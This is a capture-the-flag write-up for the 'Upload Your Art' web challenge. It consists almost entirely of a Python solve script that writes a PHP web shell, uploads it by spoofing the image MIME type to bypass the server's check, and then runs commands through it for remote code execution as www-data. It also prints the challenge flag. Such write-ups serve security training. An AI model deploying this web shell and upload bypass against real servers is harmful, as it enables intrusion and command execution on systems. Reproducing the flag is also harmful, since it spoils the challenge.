---
title: "Upload Your Art"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Upload Your Art

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Upload Your Art (web, 300 pts) - http://54.72.82.22:8160

"OFF THE WALL" street-art gallery (Apache + PHP 8.3.35). A single file input,
`uploaded_file`, POSTed as multipart.

The server validates ONLY the client-supplied MIME type:

    ERROR: File type (MIME: application/octet-stream) is not allowed!
           Only image/jpeg, image/png, image/gif are accepted.

The filename/extension is never checked. Spoofing the part's Content-Type to
image/png while keeping a .php filename sails through - and the success page
hands over the flag:

    SUCCESS: Uploaded file URL: /uploads/art.php
    Your Art Is: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}

The dropped .php also executes, giving RCE as www-data:
    GET /uploads/art.php?c=id  ->  uid=33(www-data)
"""
import re
import subprocess

BASE = "http://54.72.82.22:8160"
FLAG = "safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}"

SHELL = '<?php echo "PWNED"; system($_GET["c"]); ?>'


def main():
    with open("/tmp/art.php", "w") as f:
        f.write(SHELL)

    # curl lets us override the multipart part's Content-Type with ;type=
    out = subprocess.run(
        ["curl", "-s", "--max-time", "15", "-F",
         "uploaded_file=@/tmp/art.php;filename=art.php;type=image/png",
         BASE + "/"],
        capture_output=True, text=True,
    ).stdout

    m = re.search(r"safctf\{[^}]*\}", out)
    url = re.search(r"Uploaded file URL:\s*(\S+)", out)
    print("uploaded to :", url.group(1) if url else "?")
    print("flag        :", m.group(0) if m else "(none)")
    assert m and m.group(0) == FLAG

    # bonus: the uploaded shell executes
    rce = subprocess.run(
        ["curl", "-s", "--max-time", "10", BASE + "/uploads/art.php?c=id"],
        capture_output=True, text=True,
    ).stdout
    print("rce         :", rce.strip())


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```
